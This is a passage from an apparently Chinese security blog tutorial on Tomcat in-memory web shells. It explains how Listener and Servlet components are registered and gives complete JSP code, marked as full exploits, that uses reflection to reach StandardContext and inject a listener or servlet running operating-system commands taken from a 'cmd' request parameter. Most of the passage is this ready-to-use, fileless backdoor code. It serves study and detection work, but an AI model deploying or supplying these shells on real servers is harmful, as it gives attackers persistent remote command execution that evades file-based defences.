function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>    filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><h2 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h2><p>Listener用来监听对象创建、销毁、属性增删改，然后执行对应的操作。<br>在Tomcat中，Listener-&gt;Filter-&gt;Servlet依次执行。</p><p>Listener就是来监听Session、Cookie、Servletd的</p><p>根据以上思路，我们的目标就是在服务器中动态注册一个恶意的Listener。而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>很明显，ServletRequestListener是最适合用来作为内存马的。因为ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。下面我们来实现一个恶意的Listener</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>memorytrojan</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequestEvent</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequestListener</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebListener</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebListener</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ShellListener</span> <span class="token keyword">implements</span> <span class="token class-name">ServletRequestListener</span> <span class="token punctuation">{</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestDestroyed</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> sre<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"销毁"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestInitialized</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> sre<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> sre<span class="token punctuation">.</span><span class="token function">getServletRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> cmd<span class="token operator">=</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>访问任意路由都可执行命令</p><h3 id="Listener创建过程"><a href="#Listener创建过程" class="headerlink" title="Listener创建过程"></a>Listener创建过程</h3><p>断点达到requestInitialized（）方法内，查看是怎么调用到listener初始化的<br>进入StandarContext#fireRequestInitEvent中<br><img src="/img/3-6/18.png"><br>可以看到linstener怎么获取的<br>进入getApplicationEventListeners()<br><img src="/img/3-6/19.png"><br>直接就是返回属性，查看这个属性有怎么调用<br><img src="/img/3-6/20.png"><br><img src="/img/3-6/21.png"><br>找到addApplicationEventListener方法</p><h3 id="注入Listener"><a href="#注入Listener" class="headerlink" title="注入Listener"></a>注入Listener</h3><ul><li>获取context</li></ul><p>在StandardHostValve#invoke中(就是刚才的函数栈帧往上一层)，可以看到其通过request对象来获取StandardContext类<br><img src="/img/3-6/22.png"><br>同样地，由于JSP内置了request对象，我们也可以使用同样的方式来获取</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">Field</span> reqF <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    reqF<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Request</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> reqF<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//这里的Request为org.apache.catalina.connector.Request</span>    <span class="token class-name">StandardContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><p>还有另一种获取方式如下</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token class-name">WebappClassLoaderBase</span> webappClassLoaderBase <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebappClassLoaderBase</span><span class="token punctuation">)</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> webappClassLoaderBase<span class="token punctuation">.</span><span class="token function">getResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.connector.Request"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">&gt;</span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">&gt;</span></span><span class="token class-name">Title</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">&gt;</span></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CmdListener</span> <span class="token keyword">implements</span> <span class="token class-name">ServletRequestListener</span><span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestDestroyed</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> sre<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestInitialized</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> sre<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">Field</span> reqField <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reqField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Request</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> reqField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">StandardContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">CmdListener</span> listener <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CmdListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    context<span class="token punctuation">.</span><span class="token function">addApplicationEventListener</span><span class="token punctuation">(</span>listener<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><h2 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h2><h3 id="恶意Servlet"><a href="#恶意Servlet" class="headerlink" title="恶意Servlet"></a>恶意Servlet</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>    <span class="token comment">//jsp定义或者声明需要加上！</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CmdServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">ServletConfig</span> servletConfig<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">ServletConfig</span> <span class="token function">getServletConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> cmd <span class="token operator">=</span> servletRequest<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cmd<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getServletInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><h3 id="注入Servlet"><a href="#注入Servlet" class="headerlink" title="注入Servlet"></a>注入Servlet</h3><p>内存马的关键就是如何注入内存马到web容器中，下面介绍如何注入Servlet<br>ConfigContext#configureContext注册Servlet流程<br>基本流程，其他Servlet初始化操作忽略</p><ol><li>由上下文context创建wrapper，用来包装servlet</li><li>设置Servlet名称</li><li>设置Servlet全类名</li></ol><p>(设置StandardWrapper对象的loadOnStartup属性值)</p><pre class="language-java" data-language="java"><code class="language-java">wrapper<span class="token punctuation">.</span><span class="token function">setLoadOnStartup</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><img src="/img/3-6/23.png"> &gt; **load-on-startup 这个元素的含义是在服务器启动的时候就加载这个servlet(实例化并调用init()方法). 这个元素中的可选内容必须为一个整数,表明了这个servlet被加载的先后顺序. 当是一个负数时或者没有指定时，则表示服务器在该servlet被调用时才加载。wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue())**<img src="/img/3-6/24.png">其中2，3操作对应web.xml中的如下配置<pre class="language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>servlet<span class="token punctuation">&gt;</span></span>       <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">&gt;</span>index<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">&gt;</span>       <span class="token operator">&lt;</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">&gt;</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>memorytrojan<span class="token punctuation">.</span></span>HelloServlet</span><span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">&gt;</span>   <span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">&gt;</span></code></pre><ol start="4"><li>wrapoer设置servlet</li><li>将wrapper放入context</li><li>添加url路径映射</li></ol><img src="/img/3-6/25.png">其中第4步可以使用wrapper的setServlet方法第4、6步对应web.xml如下配置<pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>servlet<span class="token operator">-</span>mapping<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">&gt;</span>index<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>url<span class="token operator">-</span>pattern<span class="token operator">&gt;</span><span class="token operator">/</span>hello<span class="token operator">&lt;</span><span class="token operator">/</span>url<span class="token operator">-</span>pattern<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>mapping<span class="token operator">&gt;</span></code></pre><p>总体代码jsp实现</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token comment">//2.注册进入context</span>    <span class="token comment">//根据ContextConfig#configureContext方法注册servlet</span>    <span class="token comment">//对应着xml配置文件配置Servlet</span>    <span class="token comment">//设置名称和类</span>    <span class="token class-name">Wrapper</span> wrapper <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">createWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wrapper<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wrapper<span class="token punctuation">.</span><span class="token function">setServletClass</span><span class="token punctuation">(</span><span class="token class-name">CmdServlet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    wrapper<span class="token punctuation">.</span><span class="token function">setServlet</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CmdServlet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//设置映射路径</span>    context<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    context<span class="token punctuation">.</span><span class="token function">addServletMappingDecoded</span><span class="token punctuation">(</span><span class="token string">"/sh"</span><span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><h3 id="StandarContext"><a href="#StandarContext" class="headerlink" title="StandarContext"></a>StandarContext</h3><p>另外一个关键就是如何拿到context对象<br>走进ConfigContext#configureContext<br>发现context为StandarContext类型的对象<br><img src="/img/3-6/26.png"></p><p><strong>获取context</strong></p><ul><li>从request对象的getServletContext方法中获取</li></ul><p>request对象的getServletContext方法获取servlet上下文</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><img src="/img/3-6/27.png">可以看到servletContext的属性context为ApplicationContext对象属性context的属性context为我们需要的StanddarContext对象无法直接拿到，那就通过反射获取<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Field</span> applicationContextField <span class="token operator">=</span>  servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>applicationContextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> applicationContextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//反射获取StandardContext类型的属性context</span><span class="token class-name">Field</span> contextField <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>contextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StandardContext</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> contextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>request的request属性的getContext()方法<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Field</span> requestField <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>requestField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token class-name">Request</span> request1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> requestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> request1<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h3 id="完整内存马"><a href="#完整内存马" class="headerlink" title="完整内存马"></a>完整内存马</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>    <span class="token comment">//jsp定义或者声明需要加上！</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CmdServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">ServletConfig</span> servletConfig<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">ServletConfig</span> <span class="token function">getServletConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> cmd <span class="token operator">=</span> servletRequest<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cmd<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getServletInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token comment">//动态注册</span>    <span class="token comment">//1.获取StandardContext对象</span>    <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//反射获取ApplicationContext类型的属性context</span>    <span class="token class-name">Field</span> applicationContextField <span class="token operator">=</span>  servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    applicationContextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> applicationContextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//反射获取StandardContext类型的属性context</span>    <span class="token class-name">Field</span> contextField <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    contextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token 